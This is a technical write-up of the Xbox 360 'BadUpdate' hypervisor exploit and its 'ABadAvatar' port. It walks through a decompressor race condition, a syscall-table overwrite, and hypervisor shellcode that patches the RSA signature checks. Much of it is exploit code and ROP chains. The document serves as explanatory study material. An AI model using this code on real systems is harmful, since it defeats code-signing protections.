All the computed addresses and sizes are packed into a `THREAD_ARGS` struct:

```c
ThreadArgs.UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
ThreadArgs.UpdateDataSize = pUpdateInfo->TotalSize;       // 0xD0000
ThreadArgs.pPayloadClean  = pPayloadClean;
ThreadArgs.pPayloadBuffer = pPayload;
ThreadArgs.PayloadPhys    = MmGetPhysicalAddress(pPayload);
ThreadArgs.PayloadSize    = PayloadDataSize;              // 0x6000
ThreadArgs.pCompressedDataClean   = pCleanUpdateData;
ThreadArgs.CompressedDataSize     = CleanUpdateDataSize;
ThreadArgs.pCompressedDataInBuffer = pUpdateData + UpdateDataOffset;
ThreadArgs.pScratchDataInBuffer   = pUpdateData + ScratchBufferOffset;
ThreadArgs.ScratchDataOffset      = ScratchBufferOffset;
ThreadArgs.ScratchDataSize        = 0x20000;
ThreadArgs.HvCheckAddress         = pCipherTextBuffer->dec_output_buffer;
ThreadArgs.ShellCodePhysAddress   = ShellCodePhys;
ThreadArgs.pScratchBuffer         = pScratchPtr;
```

### 3.11  Spawn the XKE Worker Thread

```c
HANDLE hXKEWorkerThread = CreateThread(NULL, 0, RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
XSetThreadProcessor(hXKEWorkerThread, 1);  // pin to hardware thread 1 (second CPU core)
ResumeThread(hXKEWorkerThread);
```

This thread runs `RunUpdatePayloadThreadProc` on CPU hardware thread 1. Separating the XKE execution loop from the overwrite loop onto different CPU cores is essential for the race to work: the overwrite loop must be running concurrently with the HV's LZX decompressor.

**`RunUpdatePayloadThreadProc` — worker thread execution loop:**

**Initialisation (runs once):**

1. Allocates a 128KB cache flush buffer via `XPhysicalAlloc(0x20000, MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES)`.

2. Calls `LockAndThrashL2(0)` and `LockAndThrashL2(1)`:
   - Each call allocates 256KB of cacheable physical memory.
   - Calls `KeLockL2(index, pPhysMemoryPtr, 256*1024, maskValue, 0)` to reserve 256KB of L2 cache pathways — preventing that space from being used for other data and forcing other data to be evicted sooner.
   - Fills the reserved range with `0x41` via `memset` to "thrash" it.
   - Calls `KeLockL2(index, pPhysMemoryPtr, 256*1024, maskValue, 0x1)` to commit/lock the range permanently.
   - The total effect is that half of the available L2 cache pathways are consumed by junk data, increasing cache pressure and causing the LZX decoder context in the scratch buffer to age out of L2 faster. This is needed for the cipher text observation to work: if the context stays in L2, the write-back to the backing physical memory (which we monitor) is delayed.

3. Patches `MmPhysical64KBMappingTable` at `0x801C1000`:
   ```c
   DWORD oldAccessMask = *(DWORD*)MmPhysical64KBMappingTable;
   *(DWORD*)MmPhysical64KBMappingTable = 0x66666666;
   ```
   `MmPhysical64KBMappingTable` is a kernel structure that describes which physical 64KB pages are accessible at virtual address `0xA0000000` (the physical view window). Setting the entry for the HV segment 3 physical range to `0x66666666` (a permissive access mask) exposes the raw encrypted bytes of HV segment 3 at `0xA0030000` in the virtual address space. This lets user-mode / kernel code observe the cipher text of HV pages.

4. Reads the initial cipher text reference values:
   ```c
   DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + 0x1F28);  // target write location in HV seg 3
   DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (0x1F28 - 0x15E8) + 0x1AD0 + 0x80);
                          = (DWORD*)(0xA0031C70);           // just past Block 14's extent
   DWORD cipherValue1 = *pCipherTextPtr1;
   DWORD cipherValue2 = *pCipherTextPtr2;
   ```
   `pCipherTextPtr2` is chosen so that it is inside the memory range that Block 14 would reach only if the decompressor wrote past the end of Block 14's data. If the cipher text at `pCipherTextPtr2` remains unchanged when `pCipherTextPtr1` changes, it means Block 14 (the smallest block in the update file) was the one that triggered the overwrite, which is the desired outcome.

**Main loop (runs continuously until exploit succeeds):**

```
while (true):
```

5. Copies `pPayloadClean` → `pPayload` (restore XKE payload to clean state before each run).
6. Copies `pCleanUpdateData` → `pCompressedDataInBuffer` (restore update data to clean state).
7. Calls `HvxKeysExecute(PayloadPhys, PayloadSize, UpdateDataPhys, UpdateDataSize, NULL, NULL)` (syscall `0x42`):
   - The HV verifies the XKE payload signature, then runs the XKE payload in a restricted HV context.
   - The XKE payload initiates LZX decompression of the update data.
   - The LZX decompressor runs inside the HV and writes decompressed data into the output buffer, using `dec_output_buffer` from the decoder context (stored in the scratch buffer at `pUpdateData + ScratchBufferOffset`).
   - Returns `0xc8000012` on normal completion (miss — race not won), or another value on a significant event.
8. Flushes cache on `pCipherTextPtr1`: `__dcbf(0, pCipherTextPtr1)`.
9. Reads `*pCipherTextPtr1` (the cipher text at HV seg 3 + 0x1F28).
10. If cipher text changed:
    a. Calls `HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0)` (syscall `0x65`) — this is a HV syscall that flushes the HV's own L2 cache view for the given physical range, ensuring a stale cached view of `pCipherTextPtr2` is evicted.
    b. Flushes `pCipherTextPtr2`: `__dcbf(0, pCipherTextPtr2)`.
    c. Reads `*pCipherTextPtr2`.
    d. If `*pCipherTextPtr2 == cipherValue2` (secondary location unchanged → Block 14 hit):
       * Sets LED to green quadrants 1, 2, 3.
       * Calls `HvWriteULONG(HV_SYSCALL_POST_OUTPUT_ADDRESS, HV_CALL_R4_GADGET_ADDRESS)`:
         - `HV_SYSCALL_POST_OUTPUT_ADDRESS = 0x8000010200015FD0 + (0xD * 4) = 0x8000010200016004`
         - `HV_CALL_R4_GADGET_ADDRESS = 0x00000354`
         - `HvWriteULONG` uses `HvxWriteByte` (syscall `0x21`) four times to write one byte at a time. Each call writes `stb r4, 2(r6) / blr` code in the HV that stores a single byte of the value at the target address minus 2.
         - The effect: the HV syscall dispatch table entry for syscall `0xD` (`HvxPostOutput`) is overwritten with `0x00000354`. The dispatch table stores 32-bit offsets into the first HV segment. Offset `0x00000354` points to the instruction sequence `mtctr r4 / bctr` in the first segment.
       * Calls `HvxPostOutputExploit(0, ShellCodePhys)`:
         - This issues syscall `0xD` with `r4 = ShellCodePhys`.
         - The HV now dispatches syscall `0xD` to offset `0x00000354`, which executes `mtctr r4; bctr`.
         - `r4 = ShellCodePhys = 0x8000000000000000 | physAddr(pShellCodeData)`.
         - The HV branches to `physAddr(pShellCodeData)` — the physical address of Stage 4.
         - **Execution of Stage 4 begins at hypervisor privilege.**
       * If Stage 4 returns `0x41414141`: restores `MmPhysical64KBMappingTable`, sets LEDs to full green, calls `XLaunchNewImage("PAYLOAD:\\default.xex", 0)` to launch the user's unsigned executable.
    e. If secondary location changed (not Block 14): updates reference values, toggles LED, continues loop.

### 3.12  Main Thread: `CiphertextOverwriteLoop`

While the worker thread hammers `HvxKeysExecute`, the main CPU thread (hardware thread 0) runs this tight assembly loop. Its job is to race against the LZX decompressor: observe when the decompressor writes its context header to the scratch buffer, and immediately overwrite the `dec_output_buffer` field with the pre-computed malicious cipher text.

**Pre-loop register setup:**

```asm
mr   r31, pScratchPtr        ; physical base of scratch buffer
mr   r30, canaries           ; lookup table canaries array
mr   r29, replacements       ; lookup table replacements array
mr   r28, replacements2      ; lookup table replacements2 array
addi r26, r31, 0x2B00        ; r26 = &scratch[0x2B00] = start of cache line containing dec_output_buffer
mr   r25, writeCount         ; = 100000  (write iterations per hit)
mr   r24, delayCount         ; = 1500000 (delay cycles after canary match)
dcbf r0, r31                 ; flush cache on scratch base
```

**Inner loop (label `loop`):**

```asm
ld   r11, 0(r31)             ; load 8 bytes from scratch buffer base (the CIDL header cipher text)
cmplwi r11, 0
beq  flush                   ; if zero, no active XKE run yet → flush and retry
extrdi r10, r11, 10, 0       ; extract top 10 bits of cipher text as hash index
sldi r10, r10, 3             ; multiply by 8 (ULONGLONG index)
ldx  r9, r30, r10            ; r9 = canaries[index]
cmpld cr6, r11, r9
bne  cr6, flush              ; if cipher text doesn't match any canary → flush and retry
```

If the cipher text matches a canary:

```asm
mtctr r24                    ; counter = 1,500,000
delay:
  nop
  bdnz delay                 ; busy-wait 1,500,000 cycles
```

This delay is calibrated so that after the LZX decoder writes the context header, it advances to the point where it is about to process Block 14, approximately 1,500,000 CPU cycles later. The goal is to overwrite `dec_output_buffer` in the window between when the decompressor has validated the context and before it uses `dec_output_buffer` to write Block 14's output.

```asm
mtctr r25                    ; counter = 100,000
ldx   r9, r29, r10           ; r9 = replacements[index]  (cipher text of dec_end_input_pos)
ldx   r8, r28, r10           ; r8 = replacements2[index] (cipher text of dec_output_buffer = 0x8000010600031380)
overwrite:
  std  r9, 0x20(r26)         ; write replacement dec_end_input_pos at scratch[0x2B20]
  std  r8, 0x28(r26)         ; write replacement dec_output_buffer at scratch[0x2B28]
  dcbst r0, r26              ; store-back to L2/memory immediately
  bdnz overwrite             ; repeat 100,000 times
```

Writing 100,000 times is necessary because the HV may be evicting the scratch buffer from its cache and re-loading it repeatedly. The repeated writes maximise the probability that the HV reads the malicious value rather than the original legitimate value.

```asm
flush:
  dcbf r0, r31               ; flush the scratch buffer observation point
  b    loop
```

The `dcbf` (data cache block flush) invalidates the cache line containing the scratch buffer's first 8 bytes, forcing the next `ld r11, 0(r31)` to fetch from main memory, giving a fresh view of whatever the HV's decompressor wrote most recently.

When the timing aligns — the overwrite loop writes the malicious `dec_output_buffer` cipher text into the scratch buffer between the HV's context-header write and its read of `dec_output_buffer` for the Block 14 write — the LZX decompressor in the HV will decompress Block 14 directly into `0x8000010600031380` (HV segment 3 + `0x1380`). The specific bytes at offset `BLOCK_14_TARGET_OFFSET = 0x15E8` within Block 14 contain the instruction sequence `stb r4, 2(r6) / blr`, which lands at `HV_SEG3_OVERWRITE_OFFSET = 0x1F28` inside segment 3. This is the instruction sequence that `HV_CALL_R4_GADGET_ADDRESS` (`0x354`) needs to exist in — and after a successful race it does.

---

## Stage 4 — Hypervisor Shell Code: Repair and Patch

**Source file:** `Stage4/BadUpdateExploit-4thStage.asm`, `Stage4/Stage4_CleanHvData_Retail_17559.bin`

Stage 4 is a small shell code payload that executes at Ring -1 (hypervisor privilege). It is called when the HV dispatches syscall `0xD` after the syscall table has been overwritten in Stage 3. At entry, `r4` contains the physical address of Stage 4 (the value that was put in the overwritten syscall table entry). The Stage 4 entry point is `_hv_payload_start`.

### 4.1  Setup Stack Frame

```asm
mflr  r12
std   r12, -0x8(r1)    ; save link register
std   r30, -0x18(r1)   ; save r30
std   r31, -0x10(r1)   ; save r31
addi  r1, r1, -0x30    ; allocate 0x30 bytes of stack space
mr    r31, r4           ; r31 = shell code base address (physical address of Stage 4 binary)
```

`r31` serves as the base address for all position-independent data references within Stage 4.

### 4.2  Zero the SMC Command Buffer

```asm
addi  r12, r1, (StackSize + SmcCmdBuffer)   ; r12 = &smc_command_buffer on stack
                                             ; StackSize = 0x30, SmcCmdBuffer is the offset
                                             ; within the frame reserved for the 16-byte buffer
std   r0, 0(r12)   ; zero first 8 bytes
std   r0, 8(r12)   ; zero next 8 bytes
```

The SMC (System Management Controller) command buffer on the stack is zeroed before being filled with the LED command.

### 4.3  Send LED Color Update via SMC

```asm
li    r11, 0x99    ; LED color command opcode
stb   r11, 0(r12)
li    r11, 0xFF    ; LED override mode
stb   r11, 1(r12)
li    r11, 0xFF    ; color value = orange
stb   r11, 2(r12)

mr    r3,  r12     ; r3 = pointer to SMC command buffer
mr    r11, r31
addi  r11, r11, (HvxSendSMCMessage - _hv_payload_start)
mtctr r11
bctrl              ; call HvxSendSMCMessage
```

`HvxSendSMCMessage` is a Stage 4-internal function that communicates with the SMC hardware directly (not via the kernel, since we are in the HV). It:

1. Computes the SMC's memory-mapped physical address: `0x80000200EA001000`.
2. Writes `0x04000000` to the SMC status register at offset `0x84` to mark it as "busy".
3. Issues an `eieio` (enforce in-order execution of I/O) barrier.
4. Loops four times, each time reading a 32-bit dword from the command buffer and writing it to the SMC command register at offset `0x80`, followed by `eieio`.
5. Writes `0` to the SMC status register to mark it as "ready".

The LED flashes orange to confirm that Stage 4 is executing in HV context.

### 4.4  Restore the Corrupted Hypervisor Data Segment

The race condition in Stage 3 wrote Block 14 decompression output to HV segment 3. The decompressor wrote starting at `dec_output_buffer` (`0x8000010600031380`), which lands at offset `0x1380` inside the segment. Block 14 is `0x1AD0` bytes of decompressed data, so the write spans offsets `0x1380`–`0x2E50` within segment 3. Specifically, bytes at intra-block offset `HV_SEG3_OVERWRITE_OFFSET - 0x1380 = 0x0FA8` within Block 14 have overwritten the instruction sequence at offset `0x1F28` that Stage 4 needs (`stb r4, 2(r6) / blr`), along with all surrounding code up to the end of Block 14's write range. All of this must be restored to the original HV content before the patched HV will function correctly.

Stage 4 carries a clean copy of the affected segment inside itself, embedded as `Stage4_CleanHvData_Retail_17559.bin` (included via `.incbin`), aligned to a 128-byte (cache line) boundary:

```asm
li    r5, 0x10000 / 0x80                                          ; cache line count = 0x200
ld    r4, (hv_restore_data_address - _hv_payload_start)(%r31)    ; r4 = 0x8000010600030000
addi  r3, r31, (hypervisor_restore_data - _hv_payload_start)     ; r3 = clean data pointer in Stage 4
li    r11, HvpRelocateCacheLines    ; = 0x00000E14
mtctr r11
bctrl
```

`HvpRelocateCacheLines` is an internal HV function that copies `r5` cache lines from `r3` to `r4`, ensuring all cache lines are written to the correct physical addresses and flushed. After this call, HV segment 3 contains its original clean content — the corruption introduced by the race attack is fully undone. This is essential: leaving corrupted HV code would cause random crashes later.

### 4.5  Patch the Hypervisor RSA Signature Check

The HV function `HvpImageSignatureVerification` calls `XeCryptBnQwBeSigVerify` to validate the RSA signature of any executable before allowing it to run. To allow unsigned code, this call must always return success.

The `li r3, 1` instruction (opcode `0x38600001`) makes `XeCryptBnQwBeSigVerify` appear to always return 1 (success):

```asm
lis   r4, 0x3860        ; upper 16 bits of opcode 0x38600001
ori   r4, r4, 1         ; r4 = 0x38600001  ('li r3, 1')
ld    r3, (hv_rsa_patch_address - _hv_payload_start)(%r31)
                        ; r3 = 0x8000010400029B04
stw   r4, 0(r3)         ; overwrite 'bl XeCryptBnQwBeSigVerify' with 'li r3, 1'
```

Then flush the instruction cache line so the CPU fetches the updated instruction:

```asm
li    r5, 0x7F
andc  r3, r3, r5        ; align r3 down to cache line boundary
icbi  0, r3             ; invalidate instruction cache line
```

### 4.6  Disable RMCI to Access the Encrypted Kernel Address Range

The kernel code pages live in a memory range that has RMCI (Re-enable Memory Cache Inhibit) enabled, which prevents normal caching and means the CPU cannot execute writes to that range without first disabling RMCI:

```asm
li    r3, 0
li    r11, HvpSetRMCI    ; = 0x00000398
mtctr r11
bctrl                    ; HvpSetRMCI(0) — enable caching (disable RMCI)
```

### 4.7  Patch the Kernel RSA Signature Check

The kernel function `XexpVerifyXexHeaders` calls `XeCryptBnQwBeSigVerify` to validate XEX header signatures. Patching it with `li r3, 1` makes it always pass:

```asm
lis   r4, 0x3860
ori   r4, r4, 1          ; r4 = 0x38600001
ld    r3, (kernel_rsa_patch_address - _hv_payload_start)(%r31)
                         ; r3 = 0x800003000007BFDC
stw   r4, 0(r3)          ; overwrite 'bl XeCryptBnQwBeSigVerify'
```

Flush instruction cache:

```asm
li    r5, 0x7F
andc  r3, r3, r5
icbi  0, r3
```

### 4.8  Re-enable RMCI

```asm
li    r3, 1
li    r11, HvpSetRMCI
mtctr r11
bctrl                    ; HvpSetRMCI(1) — disable caching (re-enable RMCI)
```

RMCI must be restored so that the memory protection model of the kernel range is not permanently altered in a way that could cause other subsystems to malfunction.

### 4.9  Return Success Code to Stage 3

```asm
lis   r3, 0x4141
ori   r3, r3, 0x4141    ; r3 = 0x41414141
```

Stage 3 checks `if (result != 0x41414141)` and treats any other value as a failure. The magic value `0x41414141` (`'AAAA'`) is used as a sentinel.

### 4.10  Destroy Stack Frame and Return

```asm
addi  r1, r1, StackSize   ; deallocate stack frame
ld    r30, -0x18(r1)
ld    r31, -0x10(r1)
ld    r12, -0x8(r1)
mtlr  r12
blr                        ; return to HV syscall dispatcher
```

Control returns to the HV's syscall dispatcher. The dispatcher resumes normally, returns to the kernel, and then to Stage 3's `HvxPostOutputExploit` call site. Stage 3 reads the return value (`0x41414141`), restores `MmPhysical64KBMappingTable`, sets LEDs to fully green, and launches the user's unsigned executable via `XLaunchNewImage("PAYLOAD:\\default.xex", 0)`.

---

## Summary of the Full Execution Flow

```
Game (Ring 3) → Stage 1 save game overflow
                 → stack pivot to fake ROP stack
                 → mount PAYLOAD: drive
                 → allocate memory for Stage 2
                 → read BadUpdateExploit-2ndStage.bin from USB
                 → pivot to Stage 2 ROP chain

Stage 2 (Ring 3 ROP) → map Flash: drive
                     → load/unload bootanim.xex N times
                     → capture cipher text for each 16-byte block of Stage 3
                     → write Stage 3 cipher text into bootanim code page
                     → jump to bootanim code page (0x98030000) = Stage 3

Stage 3 (Ring 0) → read update_data.bin and xke_update.bin
                 → precompute cipher text lookup table (1024 whitening variants)
                 → expose HV segment 3 cipher text via MmPhysical64KBMappingTable
                 → spawn worker thread (core 1): hammers HvxKeysExecute in a loop,
                   monitors HV cipher text for Block 14 overwrite,
                   on success overwrites syscall table + calls Stage 4 + launches default.xex
                 → main thread: tight loop reads scratch buffer cipher text,
                   matches against lookup table, delays, then hammers dec_output_buffer
                   with malicious pointer cipher text to win the race

Stage 4 (Ring -1) → set LED orange
                  → restore corrupted HV segment 3 from embedded clean copy
                  → patch HV XeCryptBnQwBeSigVerify call → li r3, 1
                  → disable RMCI
                  → patch kernel XeCryptBnQwBeSigVerify call → li r3, 1
                  → re-enable RMCI
                  → return 0x41414141

Stage 3 (back, Ring 0) → set LED fully green
                       → XLaunchNewImage("PAYLOAD:\\default.xex")
```

---

# ABadAvatar — Como funciona e diferenças de código

**Repositório:** https://github.com/shutterbug2000/ABadAvatar  
**Autor:** shutterbug2000  
**Base:** fork/port do exploit BadUpdate de grimdoomer

ABadAvatar é uma adaptação do exploit BadUpdate que troca o vetor de ataque inicial: em vez de explorar o save game de um jogo (Tony Hawk's American Wasteland ou Rock Band Blitz), ele explora um **item cosmético de Avatar** armazenado no perfil do usuário na memória flash interna do console. O resultado final é idêntico — execução de código não-assinado no nível do hypervisor — mas o caminho até lá é diferente nas etapas 0 e 1, e há ajustes menores nas etapas 2 e 3.

---

## Visão Geral: Como o ABadAvatar funciona

O Xbox 360 armazena os dados de Avatar do usuário (roupas, itens comprados, etc.) em um arquivo XEX no perfil do usuário na flash interna: `\Device\Flash\GamerProfile.xex`. Quando o usuário acessa a tela de seleção de perfil no dashboard e move o cursor, o sistema carrega e processa os itens de Avatar do perfil destacado. Esse processamento ocorre dentro de uma **XamTask** — uma tarefa do Kernel gerenciada pelo módulo `xam.xex`, com sua própria thread e contexto de memória.

O exploit usa um item de Avatar cuidadosamente construído que contém código de shell comprimido em um campo de dados binários do item. Quando o dashboard processa esse item, ele descomprime e executa o payload embarcado, que realiza um **stack pivot** para uma cadeia ROP também armazenada no arquivo do item. Toda a execução das etapas 0 e 1 acontece dentro dessa XamTask.

A diferença crucial em relação ao BadUpdate original é que:
- Não é necessário nenhum jogo específico — o exploit funciona diretamente a partir do dashboard, apenas movendo o cursor de seleção de perfil
- A execução ocorre dentro de uma **XamTask** em vez de um processo de jogo, o que exige uma sequência especial de "saída de XamTask" no final da Stage 2, antes de passar para a Stage 3

---

## Stage 0 — Payload Inicial no Item de Avatar (Ring 3)

### O que é

O Stage 0 não tem um arquivo `.asm` editável separado — é considerado estático e está incorporado diretamente no arquivo de item de Avatar do perfil de release, no offset de arquivo **`0x2200`**. O código é comprimido (dificultando modificações) e tem duas responsabilidades únicas:

1. **Exibir texto anti-golpe** na tela enquanto o exploit inicializa, para que usuários não pensem que o console está quebrando.
2. **Realizar o stack pivot inicial** que transfere o controle da execução do dashboard para a cadeia ROP da Stage 1.

O Stage 0 é equivalente funcional aos bytes de overflow que, no BadUpdate original, sobrescrevem o registrador `lr` com o endereço do gadget `stack_pivot` (`lwz r1, 0(r1) / lwz r12, -8(r1) / mtlr r12 / blr`). A diferença é que aqui a vulnerabilidade está no processamento do item de Avatar pelo dashboard, e não em um parser de save game de jogo.

### Por que não é modificado

A estrutura do item de Avatar é comprimida de forma não trivial. O Stage 0 somente exibe um texto e faz o pivot — não há razão para modificá-lo. Se você precisar alterar o Stage 1 (que começa em `0x2200` no arquivo do item), a abordagem é um hex-edit direto no arquivo de saída binário.

---

## Stage 1 — Cadeia ROP Inicial no Item de Avatar (Ring 3)

### Como é inserido

Em vez de estar dentro de um save game de THAW/RBB no cartão USB, a Stage 1 do ABadAvatar fica **dentro do próprio arquivo de item de Avatar** no perfil do usuário na flash, a partir do offset `0x2200`. Não existe um arquivo de save game ou cartão USB envolvido para a Stage 1.

O arquivo ASM da Stage 1 (`Stage1/BadUpdateExploit.asm`) é **funcionalmente idêntico** ao do BadUpdate original para THAW. A estrutura completa da cadeia ROP é a mesma:

1. Gadget de transição inicial (`__restgprlr_31`)
2. `memcpy` para copiar o segmento de dados para uma região gravável
3. `NtAllocateVirtualMemory` para alocar memória para a Stage 2
4. `ObCreateSymbolicLink` para montar o drive `PAYLOAD:` apontando para o USB
5. Leitura do arquivo `BadUpdateExploit-2ndStage.bin` do USB para a memória alocada
6. Ajuste do endereço da cadeia Stage 2 e configuração do target do stack pivot
7. Stack pivot para a Stage 2

A única diferença relevante é como o controle chega aqui: não é um overflow de buffer de nome de gap de save game, mas sim a execução do payload descomprimido pelo processador de itens de Avatar.

### Diferença nas strings de symlink

No BadUpdate original (`Common/BadUpdateExploit_Data.asm`), os paths de symlink usam o namespace `\??`:

```asm
# BadUpdate original
_hdd_symlink_mount_str:
    .ascii  "\\??\\PAYLOAD:"

_flash_symlink_mount_str:
    .ascii  "\\??\\Flash:"
```

No ABadAvatar (`Common/BadUpdateExploit_Data.asm`), o namespace é `\System??` — necessário porque o código executa dentro de uma XamTask do módulo `xam.xex`, que utiliza um namespace de objeto diferente do namespace de processo de jogo:

```asm
# ABadAvatar
_hdd_symlink_mount_str:
    .ascii  "\\System??\\PAYLOAD:"

_flash_symlink_mount_str:
    .ascii  "\\System??\\Flash:"
```

### Diferença no `_second_stage_chain_address`

No BadUpdate original, `_second_stage_chain_address` começa em zero e é preenchido em tempo de execução:

```asm
# BadUpdate - BadUpdateExploit_Data.asm
_second_stage_chain_address:
    .long   0x00000000
```

No ABadAvatar, esse campo é pré-inicializado com uma constante `second_stage_chain_addressA` definida no arquivo de configuração `Avatar.asm`. Isso é necessário porque o contexto de execução dentro da XamTask tem um endereço de memória fixo e conhecido para onde a Stage 2 é alocada:

```asm
# ABadAvatar - BadUpdateExploit_Data.asm
_second_stage_chain_address:
    .long   second_stage_chain_addressA
```

### Diferença no `_overwrite_loop_secondary_buffer_address`

No BadUpdate original, este campo começa em zero e é preenchido em runtime:

```asm
# BadUpdate
_overwrite_loop_secondary_buffer_address:
    .long   0x00000000
```

No ABadAvatar, é pré-inicializado com um endereço hardcoded `overwrite_loop_secondary_buffer_address_hardcoded`. O comentário no código explica:

```asm
# ABadAvatar
# If the stack goes too low in XAM, it bugchecks (at least, I think that's
# what's going on...). So we use a hardcoded higher address.
_overwrite_loop_secondary_buffer_address:
    .long   overwrite_loop_secondary_buffer_address_hardcoded
```

### Estrutura `_new_task_attributes` adicionada

O ABadAvatar acrescenta uma estrutura `_new_task_attributes` no segmento de dados que não existe no BadUpdate original:

```asm
# ABadAvatar - adicionado
_new_task_attributes:
    .long   0xA4280002
    .long   0x00000005
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
    .long   0x00000000
```

Essa estrutura é usada na sequência de saída de XamTask no final da Stage 2 (seção `_copy_and_execute_stage_three`), quando a Stage 2 precisa criar uma nova task para executar a Stage 3 fora do contexto da XamTask original.

### `BuildConfig.asm` — novo target `AVATAR`

O arquivo `BuildConfig.asm` do ABadAvatar adiciona suporte ao novo target de jogo/plataforma `AVATAR`:

```asm
# ABadAvatar - BuildConfig.asm (adicionado)
.ifdef AVATAR
    .include "Avatar.asm"
.endif
```

O arquivo `Avatar.asm` (não presente no BadUpdate original) define as constantes específicas do contexto de Avatar: `RuntimeDataSegmentAddress`, `BootAnimCodePageAddress` (`0x90110000`), `second_stage_chain_addressA`, `overwrite_loop_secondary_buffer_address_hardcoded`, e outros parâmetros de layout de memória específicos da XamTask.

---

## Stage 2 — Extração de Cipher Text e Injeção da Stage 3 (Ring 3 ROP)

A Stage 2 do ABadAvatar (`Stage2/BadUpdateExploit-2ndStage.asm`) é **estruturalmente quase idêntica** à do BadUpdate original. O mesmo mecanismo de captura de cipher text, o mesmo loop de overwrite, e a mesma macro `MEMCPY_CIPHER_TEXT` estão presentes. As diferenças são:

### 2.1  Target da oracle: `GamerProfile.xex` em vez de `bootanim.xex`

No BadUpdate, a oracle de cipher text usa `bootanim.xex` — o executável da animação de boot armazenado na flash:

```asm
# BadUpdate - BadUpdateExploit_Data.asm
_flash_bootanim_path:
    .ascii  "Flash:\\bootanim.xex"
```

No ABadAvatar, o target é `GamerProfile.xex` — o próprio executável do sistema de Avatar armazenado na flash:

```asm
# ABadAvatar - BadUpdateExploit_Data.asm
_flash_bootanim_path:
    .ascii  "\\Device\\Flash\\GamerProfile.xex"
```

**Por que isso importa:** A Stage 2 precisa de um módulo XEX que:
- Seja carregável via `XexLoadImage`
- Tenha pelo menos uma página de código com cipher text que possa ser lida como oracle
- Possa ser carregado e descarregado repetidamente sem travar o sistema

No contexto da XamTask do Avatar, `GamerProfile.xex` é o módulo adequado. `bootanim.xex` não é acessível ou confiável nesse contexto de execução.

O mecanismo permanece idêntico: carrega o módulo, obtém o endereço físico da página de código com `MmGetPhysicalAddress`, copia 16 bytes como plain-text oracle, descarrega o módulo, e então percorre o loop de captura de cipher text.

### 2.2  Endereço de destino para a Stage 3: `0x90110000` em vez de `0x98030000`

A constante `BootAnimCodePageAddress` é definida em `Avatar.asm` como `0x90110000`. Todas as referências a esse endereço na Stage 2 usam essa constante, então a única mudança de código visível é no arquivo de configuração.

No final da Stage 2, a Stage 3 é executada via:

```asm
# BadUpdate - jump to Stage 3 at 0x98030000
.long   0x00000000, BootAnimCodePageAddress  # r31 = 0x98030000
.long   call_func_dispatch
```

```asm
# ABadAvatar - jump to Stage 3 at 0x90110000
.long   0x00000000, BootAnimCodePageAddress  # r31 = 0x90110000
.long   call_func_dispatch
```

### 2.3  Sequência de saída de XamTask em `_copy_and_execute_stage_three`

Esta é a diferença mais significativa entre as duas Stage 2. No BadUpdate original, `_copy_and_execute_stage_three` finaliza com simplesmente chamar `BootAnimCodePageAddress` (Stage 3) via `call_func_dispatch`. No ABadAvatar, **antes de chamar a Stage 3**, existe uma longa sequência de gadgets que realiza uma "saída limpa da XamTask" e criação de uma nova task.

**Por que é necessário:** No BadUpdate, a Stage 2 executa dentro de um processo de jogo. Ao final, simplesmente chama o endereço de memória da Stage 3 como uma função. No ABadAvatar, a Stage 2 executa dentro de uma XamTask gerenciada pelo `xam.xex`. Se a Stage 3 for chamada diretamente sem limpar a XamTask, o sistema pode travar ou ter comportamento indefinido ao tentar retornar. A sequência de saída replica o que uma XamTask normalmente faz ao encerrar.

A sequência de saída (comentada no código como "I know it's messy and uncommented, but I'll clean it up later. Maybe.") inclui:

```asm
# ABadAvatar - _copy_and_execute_stage_three (sequência de saída de XamTask)

# 1. Chama 0x81a72b34 com ponteiro para estrutura interna da XamTask (0x81b4af5c)
#    para desregistrar a task do scheduler
CALL_FUNC 11, 0x81a72b34, R3H=0xffffffff, R3L=0x81b4af5c, R4H=0, R4L=0
# ... armazena valor de retorno em 0x81b4af60

# 2. Chama 0x81964c78 (função de cleanup de task) com o handle armazenado
CALL_FUNC 1, 0x81964c78, R3H=0, R3L=0x41414141, ...

# 3. Zera bytes de estado em 0x43D9A290
CALL_FUNC 11, memset, R3H=0, R3L=0x43D9A290, R4H=0, R4L=0, R5H=0, R5L=0x4

# 4. Chama 0x81a72b44 (notificação de término de task)
CALL_FUNC 1, 0x81a72b44, R3H=0xffffffff, R3L=0x81b4af5c, R4H=0, R4L=0x41414141

# 5. Chama 0x816ba6b0 (cria nova XamTask) com _new_task_attributes
#    para executar a Stage 3 em uma nova task limpa
CALL_FUNC 22, 0x816ba6b0, R3H=0, R3L=0x81b4af58, R4H=0, R4L=0x4,
    R5H=0, R5L=0x0, R6H=0, R6L=0x0, R7H=0, R7L=new_task_attributes

# 6. Suspende a thread atual para dar controle à nova task
CALL_FUNC 1, 0x800750d0, R3H=0, R3L=1

# ... manipulação adicional de ponteiros e chamadas para agendar a Stage 3
# como uma nova task independente em 0x90110000

# 7. Finalmente, chama Stage 3 via call_func_dispatch
.long   0x00000000, BootAnimCodePageAddress  # r31 = 0x90110000
.long   call_func_dispatch
```

Os endereços hardcoded (`0x81a72b34`, `0x81a72b44`, `0x816ba6b0`, `0x81964c78`, `0x800750d0`, `0x81725308`, `0x816B9668`, `0x81a722f4`) são endereços de funções internas do `xam.xex` versão 17559, específicos para gerenciamento de XamTasks.

---

## Stage 3 — Ataque de Race Condition: Corrupção do Contexto do Decoder LZX (Ring 0)

### Endereço de carga: `0x90110000` em vez de `0x98030000`

A única mudança obrigatória na Stage 3 é o **endereço onde o binário é carregado em memória**. No BadUpdate:

```asm
# BadUpdate - Stage3/BadUpdateExploit-3rdStage.asm (via DATA_ADDR macro)
.macro DATA_ADDR sym
    .set \sym,  BootAnimCodePageAddress + (_\sym - _start)
    # BootAnimCodePageAddress = 0x98030000
.endm
```

No ABadAvatar:

```asm
# ABadAvatar - Stage3/BadUpdateExploit-3rdStage.asm (via DATA_ADDR macro)
.macro DATA_ADDR sym
    .set \sym,  BootAnimCodePageAddress + (_\sym - _start)
    # BootAnimCodePageAddress = 0x90110000
.endm
```

